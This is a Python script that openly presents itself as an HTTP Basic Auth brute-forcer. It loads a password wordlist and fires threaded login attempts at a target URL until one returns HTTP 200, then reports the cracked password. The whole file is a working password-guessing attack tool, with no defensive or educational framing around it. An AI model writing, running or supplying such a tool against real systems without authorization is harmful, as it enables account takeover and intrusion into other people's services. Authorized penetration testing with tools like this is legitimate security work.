"""Simple HTTP Basic Auth brute-forcer using requests"""
import requests, time
from concurrent.futures import ThreadPoolExecutor, as_completed

def _try_password(session, url, user, password, timeout=10):
    """Attempt HTTP Basic Auth with given credentials. Return True if 200 OK."""
    try:
        r = session.get(url, auth=(user, password), timeout=timeout, allow_redirects=True)
        # Consider 200 as success; some apps may redirect after login, adjust as needed
        if r.status_code == 200:
            return True, r.status_code, password
        else:
            return False, r.status_code, password
    except requests.RequestException:
        return False, None, password

def http_basic_bruteforce(url, user, wordlist_path, workers=5, delay=0.1):
    """Brute-force passwords from wordlist against HTTP Basic Auth protected URL."""
    print(f"[*] Starting HTTP Basic Auth brute-force against {url} as user '{user}' using wordlist {wordlist_path}")
    # load wordlist
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {wordlist_path}")
        return None
    session = requests.Session()
    found = []
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_try_password, session, url, user, pwd): pwd for pwd in passwords}
        for fut in as_completed(futures):
            pwd = futures[fut]
            try:
                ok, status, tried = fut.result()
                if ok:
                    print(f"[!] SUCCESS: password found -> {tried} (HTTP {status})")
                    found.append(tried)
                    # Optionally: stop after first found. Here we return immediately.
                    # To continue searching, remove the break and collect all.
                    return found
                else:
                    # polite delay per result
                    time.sleep(delay)
            except Exception:
                pass
    duration = time.time() - start_time
    print(f"[*] Bruteforce completed in {duration:.2f}s. Found: {found}")
    return found
